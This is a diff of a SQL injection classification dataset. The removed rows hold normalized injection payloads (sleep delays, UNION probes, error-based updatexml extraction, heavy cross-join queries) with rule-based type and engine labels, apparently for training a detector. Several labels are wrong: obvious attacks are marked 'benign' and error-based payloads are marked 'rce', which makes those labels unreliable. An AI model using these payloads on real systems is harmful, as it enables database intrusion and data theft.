@@ -1,31 +1,101 @@
-row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
-2130,"1 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) # dyed",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
-2131,"1' where 8277 = 8277 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) --",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
-2132,-7103 ) ) or 4610 = 1871 and ( ( 1249 = 1249,1,,boolean_blind,generic,0.95,4610 = 1871 and detected — boolean_blind injection (priority 8) on generic,rule-based
-2133,"1' ) ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
-2134,"1 ) ) ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( 9184 = 9184",1,,error_based,generic,0.95,convert ( int detected — error_based injection (priority 4) on generic,rule-based
-2135,"1%"" ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ""%"" = """,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
-2136,"1 ) where 1513 = 1513 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,,time_blind,sqlite,0.95,randomblob ( is SQLite-specific time-delay function — time-based blind inference (priority 5),rule-based
-2137,"1%"" or elt ( 5873 = 5873,sleep ( 5 ) ) #",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
-2138,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and 'fbnx' = 'fbnx",1,,heavy_query,firebird,0.95,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb detected — heavy_query injection (priority 6) on firebird",rule-based
-2139,"1' ) ) as ngoo where 8641 = 8641 and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users detected — heavy_query injection (priority 6) on generic",rule-based
-2140,1' ) as jrqh where 6204 = 6204 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
-2141,"1%"" ) union all select null,null,null,null,null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
-2142,"1 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) -- mtaq",1,,heavy_query,generic,0.95,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users detected — heavy_query injection (priority 6) on generic",rule-based
-2143,"1"" ) as assu where 7521 = 7521 or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers detected — heavy_query injection (priority 6) on generic",rule-based
-2144,"1 ) as ndgd where 2367 = 2367 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,,heavy_query,generic,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on generic",rule-based
-2145,"1' in boolean mode ) union all select null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
-2146,"-4669"" or 8571 = 8571--",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
-2147,select ( case when ( 7019 = 1998 ) then 7019 else 7019* ( select 7019 from mysql.db ) end ) #,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
-2148,"1 and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers detected — heavy_query injection (priority 6) on generic",rule-based
-2149,"1"" and make_set ( 6520 = 9958,9958 )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
-2150,"1 ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( 5099 = 5099",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
-2151,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ""vabm"" = ""vabm",1,,heavy_query,generic,0.95,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users detected — heavy_query injection (priority 6) on generic",rule-based
-2152,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ""%"" = """,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
-2153,"-9122 ) as sdlg where 1546 = 1546 union all select 1546,1546,1546,1546,1546,1546,1546--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
-2154,"1', ( select ( case when ( 6948 = 4654 ) then 1 else 6948* ( select 6948 from mysql.db ) end ) )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
-2155,"1"" ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ""imlx"" = ""imlx",1,,rce,mysql,0.95,0x7171706a71 detected — rce injection (priority 1) on mysql,rule-based
-2156,1'|| ( select 'glec' from dual where 4846 = 4846,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
-2157,1' ) or sleep ( 5 ) and ( 'mdmr' like 'mdmr,1,,time_blind,mysql,0.95,"sleep (, or sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
-2158,1 ) and ( 3020 = 3020 ) *6703 and ( 9831 = 9831,1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
-2159,1 ) where 5442 = 5442,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+id,sqli_type,db_engine,confidence
+701,time_blind,mysql,1.00
+702,union_based,mysql,1.00
+703,union_based,generic,1.00
+704,union_based,generic,1.00
+705,error_based,mysql,1.00
+706,time_blind,mysql,1.00
+707,boolean_blind,mysql,0.85
+708,boolean_blind,postgresql,0.85
+709,time_blind,oracle,1.00
+710,boolean_blind,oracle,1.00
+711,boolean_blind,mysql,0.85
+712,error_based,oracle,1.00
+713,boolean_blind,generic,0.85
+714,boolean_blind,postgresql,1.00
+715,boolean_blind,mysql,0.85
+716,boolean_blind,generic,0.70
+717,time_blind,mysql,1.00
+718,error_based,oracle,1.00
+719,error_based,oracle,1.00
+720,boolean_blind,generic,0.70
+721,boolean_blind,generic,0.70
+722,boolean_blind,generic,0.70
+723,error_based,mysql,1.00
+724,union_based,mysql,1.00
+725,union_based,generic,1.00
+726,error_based,oracle,0.85
+727,time_blind,mysql,0.85
+728,time_blind,mssql,1.00
+729,boolean_blind,mysql,0.85
+730,boolean_blind,postgresql,0.85
+731,error_based,mysql,1.00
+732,error_based,oracle,1.00
+733,error_based,oracle,1.00
+734,error_based,oracle,0.85
+735,error_based,oracle,1.00
+736,time_blind,mysql,1.00
+737,error_based,oracle,1.00
+738,union_based,generic,1.00
+739,error_based,oracle,1.00
+740,error_based,oracle,1.00
+741,error_based,oracle,1.00
+742,error_based,oracle,1.00
+743,boolean_blind,postgresql,1.00
+744,time_blind,mysql,0.85
+745,union_based,generic,1.00
+746,error_based,oracle,1.00
+747,boolean_blind,mysql,0.85
+748,union_based,generic,1.00
+749,boolean_blind,mysql,0.85
+750,error_based,oracle,1.00
+751,time_blind,mysql,1.00
+752,error_based,oracle,1.00
+753,error_based,oracle,1.00
+754,boolean_blind,postgresql,1.00
+755,boolean_blind,postgresql,0.85
+756,union_based,mysql,1.00
+757,boolean_blind,generic,0.70
+758,boolean_blind,generic,0.70
+759,error_based,oracle,1.00
+760,error_based,mysql,1.00
+761,union_based,oracle,1.00
+762,error_based,oracle,1.00
+763,boolean_blind,generic,0.70
+764,error_based,mysql,1.00
+765,boolean_blind,mysql,0.70
+766,union_based,mysql,1.00
+767,union_based,generic,1.00
+768,error_based,mysql,1.00
+769,boolean_blind,generic,0.70
+770,error_based,oracle,1.00
+771,boolean_blind,postgresql,1.00
+772,boolean_blind,mysql,1.00
+773,time_blind,mysql,1.00
+774,boolean_blind,mysql,0.85
+775,boolean_blind,oracle,0.85
+776,error_based,oracle,1.00
+777,boolean_blind,postgresql,1.00
+778,boolean_blind,mysql,0.70
+779,boolean_blind,oracle,1.00
+780,boolean_blind,generic,0.70
+781,boolean_blind,postgresql,1.00
+782,error_based,oracle,1.00
+783,boolean_blind,mysql,0.85
+784,error_based,oracle,1.00
+785,time_blind,postgresql,1.00
+786,error_based,oracle,1.00
+787,time_blind,mysql,0.85
+788,error_based,oracle,1.00
+789,error_based,oracle,1.00
+790,union_based,generic,1.00
+791,union_based,generic,1.00
+792,boolean_blind,postgresql,1.00
+793,boolean_blind,oracle,1.00
+794,error_based,oracle,1.00
+795,error_based,oracle,1.00
+796,error_based,oracle,1.00
+797,error_based,oracle,1.00
+798,boolean_blind,mysql,0.85
+799,boolean_blind,postgresql,1.00
+800,boolean_blind,postgresql,1.00
